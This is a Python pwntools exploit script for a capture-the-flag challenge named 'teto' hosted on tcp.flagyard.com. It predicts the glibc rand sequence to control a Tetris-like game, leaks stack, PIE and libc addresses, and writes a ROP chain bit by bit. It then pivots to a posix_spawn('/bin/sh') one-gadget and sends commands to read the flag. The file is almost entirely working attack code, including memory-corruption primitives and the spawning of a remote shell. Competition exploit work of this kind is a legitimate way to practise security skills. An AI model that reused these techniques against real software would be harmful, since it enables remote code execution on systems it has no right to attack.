#!/usr/bin/env python3
"""Remote exploit for teto when libc is aligned on a 2 MiB boundary."""

import pickle
import time
from pathlib import Path

from pwn import args, context, log, remote
from pwnlib.exception import PwnlibException

import exploit_agent as base
from glibc_rand import glibc_sequence as portable_glibc_sequence


HOST = args.HOST or "tcp.flagyard.com"
PORT = int(args.PORT or 0)
LIBC_MAIN_RET = 0x2A1CA
# Flag-independent fake-main pivot: decoding at this unaligned entry is
# `rex; cld; leave; ret`.  The former 0x12a5fe entry began with `jne` and
# therefore broke when a libc call changed ZF before the corrupted return.
LIBC_RESTART = 0x12A5FE
PIE_PLAY_RETURN = 0x2E69
PIE_FINAL_RETURN = 0x2E7B

# Compact final path: an existing libc epilogue loads registers from the
# persistent frame, then returns to this posix_spawn("/bin/sh") one-gadget.
LIBC_FINAL_EPILOGUE = 0x17A28F
ONE_GADGET = 0x583EC

INITIAL_WRITERS = (86, 93, 94, 99, 101, 103, 106, 109)
CACHE_PATH = Path(__file__).resolve().with_name("remote_round_plans.pkl")


def glibc_sequence(count=10000):
    return portable_glibc_sequence(count)


def initial_plan(sequence):
    board = frozenset()
    plan = {}
    for index in range(79):
        pressure = index >= 71
        board, plan[index] = base.choose(
            board, sequence[index], allow_clear=not pressure,
            reserve_col9=pressure,
        )
    assert sequence[79] == sequence[80] == sequence[83] == 0
    assert len(board) >= 60
    for index in range(81, 110):
        if sequence[index] != 0:
            board, plan[index] = base.choose(
                board, sequence[index], allow_clear=False, reserve_col9=True,
            )
    return plan


def bit_writes(qword_offset, desired, current=0):
    if current & ~desired:
        raise ValueError(f"OR writer cannot change {current:#x} into {desired:#x}")
    missing = desired & ~current
    return [
        (qword_offset + bit // 8, bit % 8)
        for bit in range(64) if missing & (1 << bit)
    ]


def simulate_pressure_phase(sequence, start, board, needed):
    """Try a no-clear suffix with 2 width I's and `needed` writer I's."""
    trial = board
    placements = {}
    special = []
    pressure_latched = False
    for index in range(start, min(start + 180, len(sequence))):
        kind = sequence[index]
        if kind == 0 and (pressure_latched or len(trial) >= 60):
            pressure_latched = True
            special.append(index)
            if len(special) == needed + 2:
                return placements, special, trial
            continue
        try:
            trial, placements[index] = base.choose(
                trial, kind, allow_clear=False, reserve_col9=True,
            )
        except RuntimeError:
            return None
    return None


def plan_fresh_round(sequence, start, needed):
    """Play normally until a board-safe suffix offers enough I writers."""
    board = frozenset()
    prefix = {}
    index = start
    while index < len(sequence) - 200:
        candidate = simulate_pressure_phase(sequence, index, board, needed)
        if candidate is not None:
            suffix, special, final_board = candidate
            log.info(
                f"round plan from rand#{start}: reserve at #{index}, "
                f"setup={special[:2]}, writers={special[2:]}, "
                f"occupied={len(final_board)}"
            )
            prefix.update(suffix)
            return prefix, special
        board, prefix[index] = base.choose(
            board, sequence[index], allow_clear=True, reserve_col9=False,
        )
        index += 1
    raise RuntimeError("could not find a usable pressure/I-piece window")


def wait_for_next_round(io):
    try:
        io.recvuntil(b"GAME OVER", timeout=15)
        base.recv_complete_frame(io, 10, timeout=15)
    except EOFError:
        tail = io.clean(timeout=0.2)
        log.warning(f"EOF around restart; trailing output={tail[-300:]!r}")
        raise


def run_planned_round(io, sequence, round_plan, writes):
    start, plan, special = round_plan
    setup_low, setup_high = special[:2]
    writer_indices = special[2:]
    end = writer_indices[-1]

    payload = bytearray()
    for index in range(start, end + 1):
        if index == setup_low:
            payload += b"ddw"                 # x=6: width 10 -> 74
        elif index == setup_high:
            payload += b"d" * 11 + b"w"      # x=15: set high width bit 7
        elif index in writer_indices:
            payload += base.bit_write_command(*writes[writer_indices.index(index)])
        else:
            payload += base.placement_command(sequence[index], *plan[index])

    # The final writer spawned rand#end+1.  Top it out without spawning again.
    payload += b"d" * 100 + b" "
    io.send(bytes(payload))
    return end + 2


def precompute_rounds(sequence):
    """Plan every post-restart board before opening a network connection."""
    cursor = 111
    target_rounds = []
    for _ in range(12):
        plan, special = plan_fresh_round(sequence, cursor, 4)
        target_rounds.append((cursor, plan, special))
        cursor = special[-1] + 2
    plan, special = plan_fresh_round(sequence, cursor, 5)
    final_round = (cursor, plan, special)
    return target_rounds, final_round


def load_or_precompute_rounds(sequence):
    if CACHE_PATH.exists():
        with CACHE_PATH.open("rb") as cache_file:
            log.info(f"loading cached placements from {CACHE_PATH.name}")
            return pickle.load(cache_file)
    result = precompute_rounds(sequence)
    with CACHE_PATH.open("wb") as cache_file:
        pickle.dump(result, cache_file)
    return result


def exploit_connection(attempt, sequence, first_plan, target_rounds,
                       final_round):
    io = remote(HOST, PORT)
    base.drain(io, 0.2)

    opening = b"".join(
        base.placement_command(sequence[index], *first_plan[index])
        for index in range(79)
    )
    io.send(opening)
    base.drain(io, 0.3)

    io.send(b"ddw")
    leak74 = base.recv_complete_frame(io, 74, timeout=8)
    frame_pointer = base.decode_width74_stack_pointer(leak74)
    stage0 = frame_pointer - 168

    io.send(b"w")
    leak90 = base.recv_complete_frame(io, 80, timeout=8)
    main_ret = base.decode_width90_pointer(leak90, 96)
    pie_ret = base.decode_width90_pointer(leak90, 64)
    libc_base = main_ret - LIBC_MAIN_RET
    pie_base = pie_ret - PIE_PLAY_RETURN
    if (main_ret & 0xFFF) != (LIBC_MAIN_RET & 0xFFF):
        raise ValueError(f"implausible libc leak {main_ret:#x}")
    if (pie_ret & 0xFFF) != (PIE_PLAY_RETURN & 0xFFF):
        raise ValueError(f"implausible PIE leak {pie_ret:#x}")
    if libc_base & 0x1FFFFF:
        raise ValueError(f"remote libc is not 2 MiB aligned: {libc_base:#x}")

    # Every repeated fake-main round uses this same stage address.
    stage = stage0 + 0x18
    log.success(
        f"connection {attempt}: PIE={pie_base:#x} libc={libc_base:#x} "
        f"stage={stage:#x}"
    )

    chain = bit_writes(0x138, libc_base + ONE_GADGET)

    # First/original frame: create the permanent fake-main loop and spend the
    # two remaining I locks on the persistent ROP chain (offsets are +0x18
    # relative to the original stage).
    first_writes = [(0x120, 5)]
    first_writes += bit_writes(0x60, libc_base + LIBC_RESTART, main_ret)
    first_writes += [(offset + 0x18, bit) for offset, bit in chain[:2]]
    chain = chain[2:]
    assert len(first_writes) == len(INITIAL_WRITERS)

    for index in (81, 82):
        io.send(base.placement_command(sequence[index], *first_plan[index]))
    io.send(b"d" * 11 + b"w")
    base.drain(io, 0.2)

    payload = bytearray()
    write_iter = iter(first_writes)
    for index in range(84, 110):
        if sequence[index] == 0:
            payload += base.bit_write_command(*next(write_iter))
        else:
            payload += base.placement_command(sequence[index], *first_plan[index])
    payload += b"d" * 100 + b" "
    io.send(bytes(payload))
    wait_for_next_round(io)
    cursor = 111

    # Twelve preplanned boards provide 48 slots, enough for every possible
    # canonical 48-bit gadget address.  Repeat an already-set bit as harmless
    # padding after the target qword is complete.
    filler = bit_writes(0x138, libc_base + ONE_GADGET)[0]
    for round_plan in target_rounds:
        writes = chain[:4]
        chain = chain[4:]
        writes += [filler] * (4 - len(writes))
        cursor = run_planned_round(io, sequence, round_plan, writes)
        wait_for_next_round(io)
    assert not chain

    # libc+0x17a28f skips 0x18 bytes, pops six registers, then returns from
    # S+0x138 with rsp=S+0x140.  Patch the persistent fake-main pointer so the
    # popped rbx points at two zero PIE bytes, satisfying the one-gadget.
    final = bit_writes(0xE8, libc_base + LIBC_FINAL_EPILOGUE,
                       libc_base + 0x2A28B)
    final += bit_writes(0x108, pie_base + 0x2E6C,
                        pie_base + 0x2E64)
    assert len(final) == 5

    log.info("launching final pivot after 14 game rounds")
    run_planned_round(io, sequence, final_round, final)
    time.sleep(0.3)
    io.sendline(b"echo REMOTE_PWNED; id; cat /flag-* 2>/dev/null")
    return io


def main():
    context.log_level = args.LOG_LEVEL or "info"
    sequence = glibc_sequence()
    first_plan = initial_plan(sequence)
    log.info("precomputing repeated-round placements")
    target_rounds, final_round = load_or_precompute_rounds(sequence)
    for attempt in range(1, int(args.CONNECTIONS or 20) + 1):
        try:
            io = exploit_connection(
                attempt, sequence, first_plan, target_rounds, final_round
            )
            if io is None:
                continue
            if args.TEST:
                print(io.recvrepeat(4).decode("latin-1", errors="replace"))
                io.close()
            else:
                io.interactive()
            return
        except (EOFError, ValueError, RuntimeError, PwnlibException) as error:
            log.warning(
                f"connection {attempt} failed: {type(error).__name__}: "
                f"{error!r}"
            )
            time.sleep(1)
    log.failure("all connection attempts failed")


if __name__ == "__main__":
    main()
